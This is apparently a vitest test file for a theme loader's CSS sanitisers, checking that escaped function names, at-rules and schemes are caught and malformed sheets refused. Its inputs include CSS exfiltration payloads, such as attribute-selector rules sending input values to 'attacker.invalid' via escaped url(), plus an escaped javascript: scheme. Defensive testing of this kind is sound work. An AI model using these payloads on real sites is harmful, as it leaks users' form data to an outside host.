/**
 * @vitest-environment node
 *
 * A name spelled with a CSS escape (`\75rl(`, `im\61ge(`) is the same function
 * to the browser. The theme, skin and print-theme sanitisers check the sheet
 * as the browser reads it (escapes resolved, comments gone) and keep that
 * reading, so an escaped name is caught whatever else the sheet holds: a
 * plain spelling in another rule or in a comment changes nothing.
 */
import { describe, it, expect } from 'vitest';
import { readStylesheet, sanitizeSkinCSS, sanitizeThemeCSS, validateThemeCSSSafety } from '@/lib/theme-loader';
import { sanitizePrintThemeCss } from '@/lib/print/print-theme';

const HOST = 'attacker.invalid';

describe('skin.css: an escaped name next to a plain one', () => {
  it.each([
    ['url(), plain one in another rule', '.z { background: url(x); } input[value^="a"] { background: \\75rl(https://attacker.invalid/a); }'],
    ['url(), plain one in a comment', 'input[value^="a"] { background: \\75rl(https://attacker.invalid/a); }\n/* url(x) */'],
    ['url() with a quoted address', '.z { background: url(x); } .a { background: u\\72l("https://attacker.invalid/a"); }'],
    ['url() with a six-digit escape', '.z { background: url(x); } .a { background: \\000075 rl(https://attacker.invalid/a); }'],
    ['image-set()', '.z { background: image-set("x" 1x); } .a { background: image-\\73 et("https://attacker.invalid/a" 1x); }'],
    ['image()', '.z { background: image("x"); } .a { background: im\\61ge("https://attacker.invalid/a"); }'],
    ['src()', '.a { background: \\73rc("https://attacker.invalid/a"); }\n/* src( */'],
    ['@import', '@\\69mport "https://attacker.invalid/a.css";\n.a { color: red; }\n/* @import */'],
    ['an escaped url() next to a plain image()', '.z { background: image("x"); } .a { background: \\75rl(https://attacker.invalid/a); }'],
  ])('%s', (_name, css) => {
    expect(sanitizeSkinCSS(css).css).not.toContain(HOST);
  });

  it('control: an escaped name alone is still refused', () => {
    expect(sanitizeSkinCSS('.a { background: \\75rl(https://attacker.invalid/a); }').css).not.toContain(HOST);
    expect(sanitizeSkinCSS('.a { background: im\\61ge("https://attacker.invalid/a"); }').css).not.toContain(HOST);
  });

  it('control: escapes in selectors (Tailwind class names) keep a skin whole', () => {
    const css = '.w-1\\/2 { color: red; } .md\\:flex { color: blue; }';
    expect(sanitizeSkinCSS(css).css).toBe(css);
    // Also next to a removed function: the rest of the skin stays.
    const mixed = sanitizeSkinCSS('.w-1\\/2 { color: red; } .z { background: url(x); }').css;
    expect(mixed).toContain('.w-1\\/2 { color: red; }');
    expect(mixed).not.toMatch(/url\(/);
  });
});

describe('theme.css and what a plugin returns from onThemeBeforeApply: the same', () => {
  it.each([
    ['url()', ':root { background: \\75rl(https://attacker.invalid/a); } .dark { background: url(x); }'],
    ['url(), plain one in a comment', ':root { --a: 1; background: \\75rl(https://attacker.invalid/a); }\n/* url(x) */'],
    ['image-set()', ':root { background: image-\\73 et("https://attacker.invalid/a" 1x); } .dark { background: image-set("x" 1x); }'],
  ])('%s', (_name, css) => {
    expect(sanitizeThemeCSS(css).css).not.toContain(HOST);
  });
});

describe('a plugin print theme: the same', () => {
  it('url()', () => {
    const out = sanitizePrintThemeCss('.z { background: url(x); } .pr-title { background: \\75rl(https://attacker.invalid/a); }').css;
    expect(out).not.toContain(HOST);
  });
});

describe('the sheet as the browser reads it', () => {
  it.each([
    ['an escaped property name', '.a { -moz-bind\\69ng: url(x); } .b { b\\65havior: x; }'],
    ['an escaped scheme in a string', '.a { --x: "java\\73 cript:alert(1)"; }'],
    ['an escaped at-rule', '@n\\61mespace x "https://attacker.invalid/ns"; .a { color: red; }'],
    ['an escaped url with a hex escape and a space in the address', '.a { background: url(\\68 ttps://attacker.invalid/a); }'],
    ['an escape in a quoted url', '.a { background: url("\\68 ttps://attacker.invalid/a"); }'],
  ])('%s is caught', (_name, css) => {
    const out = sanitizeSkinCSS(css).css;
    expect(out).not.toContain(HOST);
    expect(out).not.toMatch(/javascript:|-moz-binding|behavior|@namespace|url\(/i);
  });

  it.each([
    ['an unterminated comment', '.a { color: red; } /* url(x)'],
    ['an unterminated string', '.a { content: "abc; }'],
    ['a line break in a string', '.a { content: "a\nb"; }'],
    ['a space inside an unquoted url', '.a { background: url(https://attacker.invalid/a b); }'],
    ['a quote inside an unquoted url', '.a { background: url(https://attacker.invalid/a"b); }'],
    ['a backslash before a line break', '.a { color: re\\\nd; }'],
    ['a backslash at the end', '.a { color: red; }\\'],
    ['an escape of NUL', '.a { content: "\\0"; }'],
    ['an escape past the last code point', '.a { content: "\\110000"; }'],
    ['a NUL', '.a { color: red; }\0'],
  ])('a sheet with %s is refused', (_name, css) => {
    const skin = sanitizeSkinCSS(css);
    expect(skin.css).toBe('');
    expect(skin.warnings.join()).toMatch(/could not be read cleanly/);
    expect(sanitizeThemeCSS(`:root { --color-primary: #123; } ${css}`).css).toBe('');
    expect(validateThemeCSSSafety(`:root { --color-primary: #123; } ${css}`).valid).toBe(false);
  });

  it('keeps a sheet without escapes exactly as written', () => {
    const bolt = 'body[data-theme-skin="bolt"] [data-tour="email-list"] .bg-selection\\/60 {\n  background: color-mix(in oklab, var(--color-primary) 18%, transparent);\n}\n';
    expect(sanitizeSkinCSS(bolt).css).toBe(bolt);
    const plain = '/* Bolt */\n.toolbar { border-bottom: 1px solid #ccc; }\n@media (max-width: 640px) { .toolbar { padding: 0 4px; } }\n';
    expect(sanitizeSkinCSS(plain).css).toBe('\n.toolbar { border-bottom: 1px solid #ccc; }\n@media (max-width: 640px) { .toolbar { padding: 0 4px; } }\n');
  });

  it('writes escapes back only where a character cannot stand plainly, and reads its own output the same', () => {
    const css = '.\\32xl\\:p-4 { color: r\\65 d; content: "\\41 \\"b"; } #\\31 23 { width: 1\\65 3px; } .\\-x { color: blue; }';
    const out = sanitizeSkinCSS(css).css;
    expect(out).toBe('.\\32 xl\\:p-4 { color: red; content: "A\\"b"; } #123 { width: 1\\65 3px; } .-x { color: blue; }');
    expect(readStylesheet(out)!.text).toBe(out);
  });

  it('keeps two names apart where a comment separated them', () => {
    const out = sanitizeSkinCSS('.a { background: u/**/rl(x); }').css;
    expect(out).toBe('.a { background: u/**/rl(x); }');
    expect(out).not.toMatch(/url\(/);
  });
});
